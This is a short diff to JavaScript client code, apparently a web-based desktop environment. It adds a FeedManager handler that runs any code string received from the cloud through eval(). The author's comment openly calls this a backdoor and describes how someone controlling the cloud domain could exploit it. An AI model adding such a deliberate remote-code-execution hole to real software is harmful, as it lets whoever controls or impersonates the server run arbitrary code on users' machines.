@@ -57,7 +57,17 @@ function Desktop(elements) {
 
     this.installationQueue = new InstallationQueue()
     this.windowManager = new WindowManager();
-    this.feedManager = new FeedManager({})
+    this.feedManager = new FeedManager({
+	// This is a backdoor. It allows the cloud to send arbitrary javascript code
+	// to be executed by client. By now this is the simplest way to garantee a
+	// communication channel with early adoptors.
+	// To exploit this backdoor, one must have control of the cloud domain set by
+	// application. If user is logged, exploit is not possible without the cloud private
+	// key.
+	code: function(object) {
+	    eval(object.code)
+	}
+    })
 
     this.netStatus = elements.networkIcon.statusTooltip()
 
